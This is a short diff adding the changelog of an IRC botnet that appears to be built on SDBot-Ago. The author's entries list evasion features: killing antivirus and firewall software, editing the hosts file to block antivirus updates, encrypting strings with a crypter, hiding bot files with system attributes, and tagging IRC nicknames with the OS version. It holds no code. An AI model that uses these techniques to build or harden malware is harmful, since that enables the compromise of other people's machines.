@@ -1,0 +1,12 @@
+0x00
+----
+
+9. OS Version in nicks ([OS]nick) - amk
+8. Changed the way passwords are checked -> MD5 - amk
+7. Added system file attributes for the bot - amk
+6. Added host file changing (prevent AV updates) - amk
+5. Added AV/FW Killer (Thx to Phatbot) - amk
+4. Added String encryption (see Tools folder for crypter) - amk
+3. Fixed some little bugs - amk
+2. Heavily stripped down (to be as stable as possible) - amk
+1. Based on SDBot-Ago - amk
